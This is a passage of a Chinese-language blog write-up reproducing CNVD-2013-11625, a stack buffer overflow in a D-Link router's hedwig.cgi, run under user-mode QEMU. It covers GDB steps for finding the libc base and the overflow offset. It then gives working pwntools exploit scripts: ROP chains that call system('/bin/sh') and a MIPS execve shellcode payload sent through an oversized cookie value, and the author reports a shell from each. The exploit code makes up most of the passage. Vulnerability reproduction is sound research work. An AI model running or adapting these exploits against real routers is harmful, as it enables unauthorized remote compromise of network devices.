<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B052.png" alt="CNVD-2013-11625å¤ç°52.png"></p><p>è·å¾— <code>memset()</code> å‡½æ•°çš„çœŸå®åœ°å€ä¸ºï¼š<code>0x2b333a20</code></p><p>åœ¨è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿçš„ <code>/lib</code> æ–‡ä»¶å¤¹å†…ï¼Œæ‰¾åˆ°å…¶æ‰€ä½¿ç”¨çš„ libc æ–‡ä»¶ï¼š<code>libc.so.0</code></p><p>åˆ©ç”¨ <code>objdump</code> æŸ¥æ‰¾ <code>memset()</code> å‡½æ•°çš„åç§»åœ°å€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-T</span> ./libc.so.0 <span class="token operator">|</span> <span class="token function">grep</span> memset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B053.png" alt="CNVD-2013-11625å¤ç°53.png"></p><p>è·å¾— <code>memset()</code> å‡½æ•°çš„ libc åç§»ä¸ºï¼š<code>0x34a20</code></p><p>åˆ™ libc åŸºåœ°å€ä¸ºï¼š<code>0x2b333a20 - 0x34a20 = 0x2b2ff000</code>ï¼ˆå¦‚æœè®¡ç®—ç»“æœæœ€åä¸‰ä½ä¸æ˜¯ <code>000</code> çš„è¯ï¼Œé‚£å°±è¯´æ˜ç®—é”™äº†ï¼‰</p><p>æ¥ä¸‹æ¥å°±æ˜¯ GDB æ‰§è¡Œåˆ° <code>hedwigcgi_main()</code> å‡½æ•°ç»“æŸå°†è¦è¿”å›çš„åœ°æ–¹ï¼Œè§‚å¯Ÿè¿”å›åœ°å€æ¥ç¡®å®šæº¢å‡ºçš„é•¿åº¦ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B037.png" alt="CNVD-2013-11625å¤ç°37.png"></p><p>ä¸è¿‡æˆ‘ä»¬ GDB ç°åœ¨å°±æ˜¯å¤„åœ¨ <code>hedwigcgi_main()</code> å‡½æ•°ä¸­ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç›´æ¥è¿è¡Œåˆ°å½“å‰å‡½æ•°é€€å‡ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> finish<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B054.png" alt="CNVD-2013-11625å¤ç°54.png"></p><p>æ˜¾ç¤ºè¿”å›åœ°å€ <code>0x646b6161</code> ä¸åˆæ³•ï¼Œ<code>cyclic -l</code> å¾—åˆ°æº¢å‡ºåˆ°è¿”å›åœ°å€çš„é•¿åº¦ä¸º 1009</p><h4 id="å‘ç”¨æˆ·æ€-QEMU-ä¼ é€’-payload-å‚æ•°"><a href="#å‘ç”¨æˆ·æ€-QEMU-ä¼ é€’-payload-å‚æ•°" class="headerlink" title="å‘ç”¨æˆ·æ€ QEMU ä¼ é€’ payload å‚æ•°"></a>å‘ç”¨æˆ·æ€ QEMU ä¼ é€’ payload å‚æ•°</h4><blockquote><p>ç”±äº QEMU ç”¨æˆ·çº§å¤ç°ä¸éœ€è¦ä»¿çœŸï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨ <code>qemu-mipsel-static</code> è¿è¡Œ <code>/htdocs/cgibin</code> ç¨‹åºï¼Œç„¶åå°† payload ä½œä¸ºå‚æ•°ä¼ é€’</p></blockquote><p>poc å¦‚ä¸‹ï¼š</p><ol><li>çº¯ ROP é“¾ï¼Œå³æ„é€  <code>system(&quot;/bin/sh&quot;)</code> æ¥ getshell</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x2b2ff000</span>   <span class="token comment"># æ ¹æ®è‡ªå·±è°ƒè¯•çš„åŸºåœ°å€æ¥æ›´æ”¹</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x53200</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># s0  system_addr - 1</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x159F4</span><span class="token punctuation">)</span> <span class="token comment"># s1  move $t9, $s0 (=> jalr $t9)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x6DFD0</span><span class="token punctuation">)</span> <span class="token comment"># s3  /bin/sh</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x32A98</span><span class="token punctuation">)</span> <span class="token comment"># s6  addiu $s0, 1 (=> jalr $s1)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x13F8C</span><span class="token punctuation">)</span> <span class="token comment"># ra  move $a0, $s3 (=> jalr $s6)</span>
 
payload <span class="token operator">=</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload
post_content <span class="token operator">=</span> <span class="token string">"winmt=pwner"</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""
    qemu-mipsel-static -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E CONTENT_LENGTH=11 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -E HTTP_COOKIE=\"""</span><span class="token string">" + payload + b"</span><span class="token string">""</span>\" \
    <span class="token operator">-</span>E REQUEST_URI<span class="token operator">=</span><span class="token string">"2333"</span> \
    <span class="token punctuation">.</span><span class="token operator">/</span>htdocs<span class="token operator">/</span>cgibin
<span class="token string">""</span>"<span class="token punctuation">,</span> shell <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>post_content<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ª poc æ˜¯ <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> å¤§ä½¬æä¾›çš„ï¼Œä½†æ˜¯å®æµ‹æ˜¯æ‰“ä¸é€šçš„ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B055.png" alt="CNVD-2013-11625å¤ç°55.png"></p><blockquote><p><strong>è¿™é‡Œ <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> å¤§ä½¬æœ¬äººä¹Ÿè¯´æ˜¯æ‰“ä¸é€šçš„</strong></p><p>è¯´æ˜¯è¿™ä¸ªè„šæœ¬çš„<code>ROP</code>é“¾æ„é€ æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œ<strong>ä½†æ˜¯åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ˜¯æ‰“ä¸é€šçš„</strong>ï¼Œå› ä¸º <code>system()</code> å‡½æ•°ä¸­æœ‰è°ƒç”¨ <code>fork()</code> å‡½æ•°ï¼Œè€Œ QEMU ç”¨æˆ·æ¨¡å¼æ˜¯ä¸æ”¯æŒå¤šçº¿ç¨‹çš„ï¼Œè¿™é‡Œ <code>fork()</code> çš„å¤±è´¥ï¼Œä¼šå¯¼è‡´åé¢ <code>$fp</code> æ˜¯ä¸ªç©ºæŒ‡é’ˆï¼Œå°±ä¼šå‡ºé”™ï¼Œåœ¨ç³»ç»Ÿæ¨¡å¼æ‰“å°±ä¸ä¼šå‡ºé—®é¢˜</p><p><mark>åæ¥ï¼Œæˆ‘è§£å†³äº†è¿™ä¸ª poc æ— æ³• getshell çš„é—®é¢˜ï¼Œæˆ‘å‘ç°é—®é¢˜åœ¨äº <code>b&#39;/bin/sh&#39;</code> çš„åç§»åœ°å€é”™è¯¯ï¼Œå½“ç„¶ <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> å¤§ä½¬çš„é—®é¢˜å¯èƒ½ä¸ QEMU ç‰ˆæœ¬æœ‰å…³ï¼Œå› ä¸º <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> å¤§ä½¬ä½¿ç”¨çš„æ˜¯ <code>qemu-mipsel</code> è€Œæˆ‘çš„æ˜¯ <code>qemu-mipsel-static</code>ï¼ŒåŒæ—¶æˆ‘å’Œ <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> çš„ libc åŸºåœ°å€ä¹Ÿæ˜¯ä¸ä¸€æ ·çš„</mark></p></blockquote><p>è°ƒè¯•ä¸€ä¸‹ï¼Œå°† <code>poc.py</code> çš„å¯åŠ¨å‘½ä»¤åŠ ä¸Š <code>-g 1234</code>ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""
    qemu-mipsel-static -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E CONTENT_LENGTH=11 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -E HTTP_COOKIE=\"""</span><span class="token string">" + payload + b"</span><span class="token string">""</span>\" \
    <span class="token operator">-</span>E REQUEST_URI<span class="token operator">=</span><span class="token string">"2333"</span> \
    <span class="token operator">-</span>g <span class="token number">1234</span> \
    <span class="token punctuation">.</span><span class="token operator">/</span>htdocs<span class="token operator">/</span>cgibin
<span class="token string">""</span>"<span class="token punctuation">,</span> shell <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>GDB è¿æ¥åï¼Œæˆ‘ä»¬ç›´æ¥è¿›åˆ°æ¼æ´å‡½æ•° <code>hedwigcgi_main()</code> ä¸­ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> architecture mips
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> target remote <span class="token number">127.0</span>.0.1:1234

<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> b *0x409480
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åä¸€è·¯ <code>ni</code> æ£€æŸ¥ï¼Œå‘ç°å‰é¢éƒ½æ²¡æœ‰é—®é¢˜ï¼Œæœ€å GDB å¡åœ¨è¿™ä¸ªåœ°æ–¹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B058.png" alt="CNVD-2013-11625å¤ç°58.png"></p><p>æŠ¥äº†ä¸€ä¸ªè­¦å‘Šï¼Œå¹¶ä¸”æ— æ³•å†ç»§ç»­è°ƒè¯•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">warning: GDB can<span class="token string">'t find the start of the function at 0x2b312f8b.

    GDB is unable to find the start of the function at 0x2b312f8b
and thus can'</span>t determine the size of that <span class="token keyword">function</span><span class="token string">'s stack frame.
This means that GDB may be unable to access that stack frame, or
the frames below it.
    This problem is most likely caused by an invalid program counter or
stack pointer.
    However, if you think GDB should simply search farther back
from 0x2b312f8b for code which looks like the beginning of a
function, you can increase the range of the search using the `set
heuristic-fence-post'</span> command.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯è€ƒè™‘åˆ°æˆ‘ä»¬ <code>ni</code> å•æ­¥è°ƒè¯•çš„æ—¶å€™ï¼Œå‰é¢ä¸¤ä¸ª <code>sprintf()</code> å‡½æ•°çš„æ‰§è¡Œéƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œè¿™å°±æœ‰ç‚¹å¥‡æ€ª</p><p>åæ¥æˆ‘åœ¨æ£€æŸ¥å„ä¸ªå‡½æ•°å’Œ gadget çš„åœ°å€çš„æ—¶å€™ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B056.png" alt="CNVD-2013-11625å¤ç°56.png"></p><p>æˆ‘è¿™é‡Œçš„ libc åŸºåœ°å€æ˜¯ <code>0x2b2ff000</code>ï¼Œå‘ç° <code>system()</code> å‡½æ•°çš„åœ°å€æ˜¯æ²¡é—®é¢˜çš„</p><p>ä½†æ˜¯åŸæœ¬åº”è¯¥æ˜¯ <code>b&#39;/bin/sh&#39;</code> çš„åœ°å€å´å‡ºç°äº†å¾ˆå¥‡æ€ªçš„ <code>b&#39;H\2245+\234\3025+&#39;</code>ï¼Œä½†æˆ‘å°±è®°å¾—è¿™ä¸ªå­—ç¬¦ä¸²å¾ˆçœ¼ç†Ÿï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B059.png" alt="CNVD-2013-11625å¤ç°59.png"></p><p>è¿™å°±æ˜¯æˆ‘ä»¬åˆšåˆšä½¿ç”¨ poc æ‰“å¤±è´¥çš„æ—¶å€™æŠ¥çš„é”™è¯¯ï¼š<code>sh: 1: H\x945+\x9c\xc25+: not found</code></p><p>æ‰€ä»¥é—®é¢˜å¾ˆæ˜æ˜¾äº†ï¼š<code>system()</code> åœ°å€æ˜¯å¯¹çš„ï¼Œ<code>system()</code> çš„ä¼ å‚ä¹Ÿæ˜¯å¯¹çš„ï¼Œä½†æ˜¯å‚æ•°ä¸æ˜¯ <code>&quot;/bin/sh&quot;</code></p><p>æœç´¢ <code>b&#39;/bin/sh&#39;</code> å‘ç°çœŸæ­£çš„åœ°å€åº”è¯¥æ˜¯ 0x2b359448ï¼Œäºæ˜¯åˆ©ç”¨ ROPgadget æŸ¥ä¸€ä¸‹ libc ä¸­ <code>b&#39;/bin/sh&#39;</code> çš„åç§»ï¼Œå‘ç°æ˜¯ 0x5a448ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B060.png" alt="CNVD-2013-11625å¤ç°60.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B057.png" alt="CNVD-2013-11625å¤ç°57.png"></p><p>ä¿®æ”¹ä¸€ä¸‹ poc ä¸­ <code>b&#39;/bin/sh&#39;</code> çš„åç§»ï¼Œæ–°çš„ poc å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x2b2ff000</span>   <span class="token comment"># æ ¹æ®è‡ªå·±è°ƒè¯•çš„åŸºåœ°å€æ¥æ›´æ”¹</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x53200</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># s0  system_addr - 1</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x159F4</span><span class="token punctuation">)</span> <span class="token comment"># s1  move $t9, $s0 (=> jalr $t9)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
<span class="token comment"># payload += p32(libc_base + 0x6DFD0) # s3  /bin/sh</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x0005a448</span><span class="token punctuation">)</span> <span class="token comment"># s3  /bin/sh  åŸ poc çš„åç§»æ˜¯é”™è¯¯çš„</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x32A98</span><span class="token punctuation">)</span> <span class="token comment"># s6  addiu $s0, 1 (=> jalr $s1)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x13F8C</span><span class="token punctuation">)</span> <span class="token comment"># ra  move $a0, $s3 (=> jalr $s6)</span>
 
payload <span class="token operator">=</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload
post_content <span class="token operator">=</span> <span class="token string">"winmt=pwner"</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""
    qemu-mipsel-static -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E CONTENT_LENGTH=11 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -E HTTP_COOKIE=\"""</span><span class="token string">" + payload + b"</span><span class="token string">""</span>\" \
    <span class="token operator">-</span>E REQUEST_URI<span class="token operator">=</span><span class="token string">"2333"</span> \
    <span class="token punctuation">.</span><span class="token operator">/</span>htdocs<span class="token operator">/</span>cgibin
<span class="token string">""</span>"<span class="token punctuation">,</span> shell <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>post_content<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå†æ¬¡è¿è¡Œ pocï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B061.png" alt="CNVD-2013-11625å¤ç°61.png"></p><p>æˆåŠŸï¼</p><ol start="2"><li>é€šè¿‡ shellcode æ¥ getshellï¼ˆç”±äº MIPS æ¶æ„æ˜¯æ— æ³•å¼€å¯ NX ä¿æŠ¤çš„ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ <code>ret2shellcode</code>ï¼Œä½†éœ€è¦æ³¨æ„ <code>shellcode</code> ä¸­ä¸èƒ½å­˜åœ¨ <code>b&#39;\x00&#39;</code> ç­‰å­—ç¬¦é˜²æ­¢å¯¼è‡´ <code>sprintf</code> è¢«æˆªæ–­ï¼‰</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x2b2ff000</span>   <span class="token comment"># æ ¹æ®è‡ªå·±è°ƒè¯•çš„åŸºåœ°å€æ¥æ›´æ”¹</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x436D0</span><span class="token punctuation">)</span> <span class="token comment"># s1  move $t9, $s3 (=> lw... => jalr $t9)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x56BD0</span><span class="token punctuation">)</span> <span class="token comment"># s3  sleep</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x57E50</span><span class="token punctuation">)</span> <span class="token comment"># ra  li $a0, 1 (=> jalr $s1)</span>
 
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x37E6C</span><span class="token punctuation">)</span> <span class="token comment"># s4  move  $t9, $a1 (=> jalr $t9)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x3B974</span><span class="token punctuation">)</span> <span class="token comment"># ra  addiu $a1, $sp, 0x18 (=> jalr $s4)</span>
 
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    slti $a2, $zero, -1
    li $t7, 0x69622f2f
    sw $t7, -12($sp)
    li $t6, 0x68732f6e
    sw $t6, -8($sp)
    sw $zero, -4($sp)
    la $a0, -12($sp)
    slti $a1, $zero, -1
    li $v0, 4011
    syscall 0x40404
'''</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> shellcode
 
payload <span class="token operator">=</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload
post_content <span class="token operator">=</span> <span class="token string">"winmt=pwner"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""
    qemu-mipsel-static -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E CONTENT_LENGTH=11 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -E HTTP_COOKIE=\"""</span><span class="token string">" + payload + b"</span><span class="token string">""</span>\" \
    <span class="token operator">-</span>E REQUEST_URI<span class="token operator">=</span><span class="token string">"2333"</span> \
    <span class="token punctuation">.</span><span class="token operator">/</span>htdocs<span class="token operator">/</span>cgibin
<span class="token string">""</span>"<span class="token punctuation">,</span> shell <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>post_content<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œ pocï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B062.png" alt="CNVD-2013-11625å¤ç°62.png"></p><p>ç›´æ¥ä¸€å‘å…¥é­‚ï¼</p></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>CNVD-2013-11625å¤ç°</h></span></div><div class="post-copyright__type"><span class="post-copyright-info">æœ¬æ–‡é“¾æ¥ï¼š<a href="https://www.uf4te.cn/posts/c2233a9.html">https://www.uf4te.cn/posts/c2233a9.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a" style="padding-left:6px;display:inline-block;width:120px"><h>ä½œè€…</h><div class="post-copyright-cc-info"><h>uf4te</h></div></div><div class="post-copyright-c" style="padding-left:6px;display:inline-block;width:120px"><h>å‘å¸ƒäº</h><div class="post-copyright-cc-info"><h>2024-06-12</h></div></div><div class="post-copyright-u" style="padding-left:6px;display:inline-block;width:120px"><h>æ›´æ–°äº</h><div class="post-copyright-cc-info"><h>2024-06-22</h></div></div><div class="post-copyright-c" style="padding-left:6px;display:inline-block;width:120px"><h>è®¸å¯åè®®</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY 4.0" href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CVE/">CVE</a><a class="post-meta__tags" href="/tags/IOT/">IOT</a><a class="post-meta__tags" href="/tags/QEMU/">QEMU</a><a class="post-meta__tags" href="/tags/GDB/">GDB</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/cover-131.jpg" data-sites="facebook, twitter, wechat, weibo, qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> å¥–åŠ±ä¸€ä¸‹ç«™é•¿</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/rewards/wechat.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rewards/wechat.png" 